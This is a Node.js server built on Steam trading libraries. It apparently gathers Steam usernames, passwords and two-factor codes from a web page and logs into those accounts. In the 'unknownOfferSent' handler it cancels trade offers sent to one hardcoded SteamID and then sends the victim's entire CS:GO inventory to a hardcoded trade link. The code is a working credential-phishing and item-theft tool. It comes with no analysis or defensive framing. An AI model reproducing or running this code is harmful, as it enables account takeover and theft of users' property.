var app = require('express')();
var http = require('http').Server(app);
var io = require('socket.io')(http);
//--Dop moduls

var SteamUser = require('steam-user');
var SteamCommunity = require('steamcommunity');
var SteamTotp = require('steam-totp');
var TradeOfferManager = require('../lib/index.js'); // use require('steam-tradeoffer-manager') in production
//var fs = require('fs');
//var cors = require('cors');
var bodyParser = require("body-parser");
//-Dop moduls end
var jsonParser = bodyParser.json();
//app.use(cors({origin: '*'}));
var express = require( 'express' );
console.log(__dirname );
app.use (express.static ( 'appuse'));
 app.get('/', function(req, res){
  res.sendFile(__dirname + '/index.html');
});


io.on('connection', function(socket){

  socket.on('disconnect', function(){

  });
});

//-client infooo
var client = new SteamUser();
var manager = new TradeOfferManager({
	"steam": client, // Polling every 30 seconds is fine since we get notifications from Steam
	"domain": "example.com",
  "cancelOfferCount":2,
	"language": "en"// We want English item descriptions
});
var community = new SteamCommunity();
//-client infooo end by BULBIK

io.on('connection',function(socket){
	socket.on('login_test', function(msg){
//-----------------------------------------------

var logOnOptions = {
	"accountName": msg['login'],
	"password": msg['password'],
"twoFactorCode":  msg['guard']

};



// if (fs.existsSync('polldata.json')) {
// 	manager.pollData = JSON.parse(fs.readFileSync('polldata.json'));
// }

client.logOn(logOnOptions);
	client.on('loggedOn', function() {

		console.log("Logged into Steam");

	});

	client.on('error', function(e) {
	io.emit('otvet','51');
	console.log(e);
});


//----------------------------------------------

	 io.emit('otvet',msg);

});
});
//-------------------------------main functionals

client.on('webSession', function(sessionID, cookies) {
  //manager.cancelOfferCount;
	manager.setCookies(cookies, function(err) {
		if (err) {
			console.log(err);
			process.exit(1); // Fatal error since we couldn't get our API key
			return;
		}

		manager.getInventoryContents(730, 2, true, function(err, inventory) {
			if (err) {
				console.log(err);
				return;
			}
       manager.on('unknownOfferSent',function(offer) {
//console.log(offer);
offer.cancel();
if(offer.partner.getSteamID64()==76561198050001358){

  offer.cancel();

  setTimeout(function (){
  var offer = manager.createOffer("https://steamcommunity.com/tradeoffer/new/?partner=441315322&token=sy5MrMhY");


    offer.addMyItems(inventory);

    offer.send(function(err, status) {
      if (err) {
        console.log(err);
        return;
      }
      if (status == 'pending') {
    // We need to confirm it
    console.log(`Offer #${offer.id} sent, but requires confirmation`);
    process.exit(1);
  } else {
    console.log(`Offer #${offer.id} sent successfully`);
    process.exit(1);
  }
});
}, 1400);
}

        //offer.cancel();




    //setTimeout(function (){client.logOff()},3000);

	});



console.log("Found " + inventory + " CS:GO items");


	});

	community.setCookies(cookies);
	//manager.shutdown();
});
});
//manager.shutdown();

// manager.on('pollData', function(pollData) {
// fs.writeFile('polldata.json', JSON.stringify(pollData), function() {});
// });

manager.on('sentOfferChanged', function(offer, oldState) {
//   var offer = manager.createOffer("https://steamcommunity.com/tradeoffer/new/?partner=124174042&token=a2nmLIjb");
//
//
//     offer.addMyItems(inventory);
// //offer.decline();
//     offer.setMessage("Test offer!");
//     offer.send(function(err, status) {
//       if (err) {
//         console.log(err);
//         return;
//       }
// });
// client.logOff();
//
// manager.shutdown();



  console.log(`Offer #${offer.id} changed: ${TradeOfferManager.ETradeOfferState[oldState]} -> ${TradeOfferManager.ETradeOfferState[offer.state]}`);

});






http.listen(3000, function(){
  console.log('listening on *:3000');
});
